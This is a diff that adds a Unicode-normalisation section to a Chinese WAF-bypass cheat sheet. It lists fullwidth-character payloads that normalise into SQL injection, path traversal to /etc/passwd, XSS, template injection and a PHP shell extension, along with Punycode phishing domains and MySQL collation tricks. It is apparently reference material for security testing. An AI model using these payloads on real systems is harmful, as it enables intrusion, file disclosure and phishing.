@@ -54,6 +54,27 @@ Payload 被拦
 | 宽字节（GBK） | `%df%27`（把 `'` 变成汉字字节序列吃掉反斜杠）|
 | 多重套娃 | URL → HTML 实体 → Unicode 三重编码 |
 
+**Unicode 归一化（NFKC/NFKD 后变回 ASCII 特殊字符）** `[PayloadsAllTheThings Encoding Transformations]`——WAF 在归一化**前**检查、应用在归一化**后**处理时生效：
+
+```text
+＇(U+FF07)  ＇ or ＇1＇=＇1        →  ' or '1'='1
+＂(U+FF02)  ＂ or ＂1＂=＂1        →  " or "1"="1
+﹣(U+FE63)  admin'﹣﹣             →  admin'--
+‥(U+2025)   ‥/‥/‥/etc/passwd     →  ../../../etc/passwd
+／(U+FF0F)  ／／domain.com        →  //domain.com
+＜(U+FF1C)  ＜img src=a＞          →  <img src=a/>
+﹛(U+FE5B)  ﹛﹛3+3﹜﹜            →  {{3+3}}
+ｐ(U+FF50)  shell.ｐʰｐ            →  shell.php
+ª(U+00AA)   ªdmin                 →  admin
+```
+
+归一化形式：NFC/NFD（组合/分解）、NFKC/NFKD（兼容等价替换——上表多数依赖此）。自测变换：`python3 -c "import unicodedata; print(unicodedata.normalize('NFKC', '＇'))"`。
+
+**Punycode / MySQL collation 变体** `[PayloadsAllTheThings Encoding Transformations]`：
+
+- IDN 域名：浏览器显示 `раypal.com`（西里尔 а），实际 ASCII `xn--ypal-43d9g.com`——钓鱼/绕域名白名单
+- MySQL 相似字符相等（密码重置/邮箱比对处可利用）：`SELECT 'a' = 'ᵃ';` 返回 1（`COLLATE utf8mb4_0900_as_cs` 下才返回 0）——比对的归一化语义漏洞，与 waf-bypass 的"等价替换"同源
+
 ### 4.2 协议层（分块 / 参数污染 / 方法覆盖）`[本地 src-hunter / Claude-Red]`
 
 ```http
